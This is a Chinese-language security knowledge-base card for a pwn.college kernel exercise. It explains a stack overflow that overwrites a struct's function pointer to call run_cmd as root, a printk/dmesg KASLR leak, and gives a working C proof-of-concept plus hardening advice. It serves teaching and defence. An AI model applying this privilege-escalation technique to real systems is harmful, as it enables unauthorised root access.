---
id: binary-pwn-kernel-stack-overflow-struct-function-pointer-run-cmd
title: 内核栈溢出覆盖结构体函数指针：run_cmd/call_usermodehelper 提权与 printk KASLR 泄露
type: scenario
domain: binary
path: binary/pwn/kernel
technique: kernel-stack-overflow-struct-function-pointer-run-cmd
tags:
- kernel
- pwn
- stack-overflow
- function-pointer
- run-cmd
- kaslr
- printk
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T09:50:43+08:00'
  notes: 已对照原文核对代码/地址/偏移与利用链，一致；原文为 pwn.college 教学环境，卡内已标注地址偏移依赖具体内核版本/配置，未复跑 PoC。
url: /docs/binary/pwn/kernel/binary-pwn-kernel-stack-overflow-struct-function-pointer-run-cmd/
draft: false
kb_aliases:
- 内核栈溢出函数指针
- logger.log_function
- run_cmd
- call_usermodehelper
- printk KASLR 泄露
- pwn.college level 9/10
---

## 一句话结论

内核模块 `device_write` 把最多 `0x108` 字节 `copy_from_user` 到栈上的 `struct logger { char buffer[256]; int (*log_function)(...); }`，正好覆盖函数指针；把 buffer 写成命令字符串、指针写成 `run_cmd`（`call_usermodehelper` 封装）即可执行 `/usr/bin/chmod 0777 /flag`；若开启 KASLR，先利用 `log_function=&printk` 把指针随 buffer 打印到 dmesg，用 `klogctl(3)` 泄露 printk 地址，再按固定偏移算出 run_cmd。

## 原理

- **栈上结构体**：`logger` 大小 `0x108`：`buffer[0x100]` + `log_function` 指针（偏移 `0x100`）。`device_write` 只在 `length > 0x108` 时 `BUG()`，`length == 0x108` 时 `copy_from_user(&logger, buffer, 0x108)` 正好覆盖指针。
- **调用点**：`logger.log_function((const char *)&logger)`，即用结构体地址作为第一个参数调用被覆盖的指针；把 `log_function` 指向 `run_cmd`，命令字符串就在 `buffer` 起始处，`run_cmd` 会 `argv_split` 后 `call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)` 执行。
- **无 KASLR（level 9）**：`cat /proc/kallsyms | grep run_cmd` 得到 `run_cmd=0xffffffff81089b30`，直接写入指针；payload 为 `/usr/bin/chmod 0777 /flag` + padding + 地址。
- **KASLR（level 10）**：模块仍把 `log_function` 初始化为 `printk`；先发送 `0x100` 字节 `'a'`（不覆盖指针），`printk(buffer)` 会把 buffer 及其后面的 `log_function` 指针一起打印到内核日志；用 `klogctl(10)` 取日志大小、`klogctl(3)` 读取，`strstr(buf,"aaaa...")+0x100` 取出 printk 地址。
- **相对偏移**：`run_cmd = printk - 0x2CE79`（同一内核镜像内固定）；第二次发送 `0x108` 字节覆盖指针为 run_cmd，执行 chmod，再读 `/flag`。
- **为什么可行**：栈结构体与函数指针相邻、长度检查用 `>` 而非 `>=`/结构体大小、函数指针未做保护；KASLR 只随机化基址，不改变符号间相对偏移，dmesg 泄露一个地址即可推导全部。
- **边界**：需要能写设备、模块无栈保护/CFI、KASLR 可泄露；不同内核的 `run_cmd`/`printk` 偏移不同。

## 触发条件

- 内核模块 `write` 把用户数据拷贝到栈上结构体，长度上限刚好覆盖相邻函数指针。
- 结构体中有可调用的函数指针，且调用时第一个参数指向结构体/可控 buffer。
- 模块或内核中存在 `run_cmd`/`call_usermodehelper`/`commit_creds` 等可用目标。
- KASLR 关闭，或可通过 dmesg/klogctl/其他信息泄露内核地址。
- 用户对设备有写权限。

## 利用步骤

1. 逆向 `device_write`，确认结构体布局（`buffer[0x100]` + `log_function`，大小 `0x108`）和长度检查。
2. 找目标函数：`run_cmd`（`call_usermodehelper` 封装）或 `commit_creds`；无 KASLR 直接取 `/proc/kallsyms` 地址。
3. 构造 payload：命令字符串（如 `/usr/bin/chmod 0777 /flag`）填满 `buffer`，在偏移 `0x100` 写入目标函数地址；长度 `0x108`。
4. 写设备，触发 `log_function` 调用；`run_cmd` 以 root 执行 chmod，随后读 `/flag`。
5. KASLR 变体：先发送 `0x100` 字节 `'a'`，读取 dmesg（`klogctl`）中打印的 `log_function=printk` 地址；`run_cmd=printk-0x2CE79`；再发送覆盖 payload。
6. 若 `run_cmd` 不可用，可把指针指向 `commit_creds` 并构造参数，或使用 `modprobe_path` 等技巧。

## PoC

```c
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/klog.h>

int main(void) {
    int fd = open("/proc/pwncollege", O_RDWR);
    char buf[0x108];
    memset(buf, 0, sizeof(buf));
    strcpy(buf, "/usr/bin/chmod 0777 /flag");
    *(unsigned long *)&buf[0x100] = 0xffffffff81089b30UL;  // run_cmd (no KASLR)
    write(fd, buf, 0x108);

    // KASLR 变体：先泄露 printk，再 run_cmd = printk - 0x2CE79
    // memset(buf, 'a', 0x100); write(fd, buf, 0x100);
    // int len = klogctl(10, NULL, 0); char *log = malloc(len);
    // klogctl(3, log, len); unsigned long printk = *(unsigned long *)(strstr(log, buf) + 0x100);
    // *(unsigned long *)&buf[0x100] = printk - 0x2CE79; ...

    close(fd);
    return 0;
}
```

说明：地址/偏移来自原文 pwn.college level 9/10 环境；KASLR 变体需按实际 dmesg 格式解析。PoC 未在本机复跑。

## 变体与关联

- **其他目标函数**：`commit_creds`（需参数）、`call_usermodehelper`、`modprobe_path` 覆写、`core_pattern`。
- **其他溢出**：栈缓冲区溢出覆盖返回地址/栈 canary、堆结构体函数指针；参见 [[binary-pwn-kernel-kmem-cache-uaf-encoded-callback-hijack]]。
- **KASLR 泄露源**：dmesg/printk、`/proc/kallsyms`、`/sys/module/*/sections`、内核指针未初始化泄露。
- **关联**：[[binary-pwn-kernel-module-ioctl-user-function-pointer-call]]（任意函数调用）、[[binary-pwn-stack-sparse-word-write-struct-field-rewrite-ret2libc]]（用户态结构体字段覆写）。

## 检测与防御

- **代码审计**：长度检查应对 `>= sizeof(struct)` 拒绝；不要在栈结构体里放函数指针；用户数据与函数指针分离。
- **内核加固**：栈 canary/强保护、KASLR、CFI（kCFI/IBT）、SMEP/SMAP、模块签名；限制 `/proc/kallsyms` 和 dmesg 读取。
- **检测**：监控设备写入长度等于结构体大小、dmesg 中的异常 printk 泄露、`call_usermodehelper` 调用；对 `/proc/<device>` 的异常 payload 告警。
- **边界**：本卡是 CTF/教学模块；真实内核模块应避免用户可控函数指针和栈溢出。
